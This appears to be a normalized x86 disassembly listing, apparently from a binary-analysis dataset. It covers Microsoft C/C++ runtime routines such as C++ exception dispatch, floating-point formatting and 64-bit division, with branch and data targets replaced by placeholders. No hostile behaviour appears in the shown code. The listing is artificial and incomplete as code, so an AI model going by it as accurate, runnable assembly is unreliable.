cmp ecx 0x19930521
je r-xdata
call sub_4165ec
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_41a601
push 0x8
push r--data
call sub_415830
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_415875
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_41953a
mov [ ebp - 0x4 ] 0xfffffffe
sub_41a656
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_41a67f
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_416a77
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_41a432
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_41a73e
push 0x2c
push r--data
call sub_415830
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_4197e7
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_4165ec
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_4165ec
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_4165ec
mov [ eax + 0x88 ] esi
call sub_4165ec
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_41988c
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41a864
mov eax [ ebp - 0x1c ]
call sub_415875
retn
sub_41a7d7
mov esp [ ebp - 0x18 ]
call sub_4165ec
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_41a4e0
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41a864
mov eax [ ebp - 0x1c ]
call sub_415875
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_41a864
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_41983a
pop ecx
call sub_4165ec
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_4165ec
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_419813
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_41a601
pop ecx
pop ecx
sub_41a8da
push 0xc
push r--data
call sub_415830
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_41b694
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_41b694
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_416a77
push ebx
push esi
call sub_41b694
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41b694
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41b694
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_41b694
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_41b694
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_41b694
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_412d60
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_41b694
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_41a656
pop ecx
pop ecx
push eax
push esi
call sub_412d60
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_415875
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_41a656
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_41aa59
push 0x8
push r--data
call sub_415830
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_41a656
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_41953a
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_41a8da
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415875
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_41a656
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_41953a
jmp r-xdata
sub_41aaeb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_41aa59
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_419508
call sub_419541
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_41a4e0
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_41a73e
add esp 0x28
test eax eax
je r-xdata
sub_41ab59
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_4165ec
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_4165ec
lea edi [ eax + 0x80 ]
call sub_41643c
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_419774
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_416a77
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4195fe
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_41aaeb
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_41ac60
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_416a77
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_4165ec
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_416a77
call sub_416a2b
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41ab59
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_4165ec
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_4165ec
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_4165ec
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_41b694
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_419774
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_416a77
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_41a601
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_4165ec
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_4165ec
mov edi [ eax + 0x94 ]
call sub_4165ec
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_41a67f
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_41a67f
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_4138af
test al al
jne r-xdata
call sub_416a77
cmp eax 0x19930522
jne r-xdata
call sub_4165ec
call sub_4165ec
call sub_4165ec
mov [ eax + 0x88 ] esi
call sub_4165ec
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_41a432
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_41a601
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_4137a7
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_4153e0
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_41aaeb
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_419541
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41a4e0
add esp 0x10
push [ esi + 0x1c ]
call sub_41a6f5
sub_41aff2
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_4165ec
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_41ac60
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41a4e0
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41b0e0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_418f4c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_418f4c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_41b130
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_41b15d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4135f1
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_41907b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41b1ae
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41b15d
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_41b1dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_4135f1
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41c148
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_41b6a6
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
sub_41b284
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_4135f1
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41c148
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_41bbf7
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
sub_41b32c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_416d94
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_416d94
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_416d42
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_4169a0
inc eax
push eax
push edi
push esi
call sub_412d60
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_41b3df
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_41b492
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_41b3df
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_41c824
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_416934
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_416cf0
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
sub_41b520
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
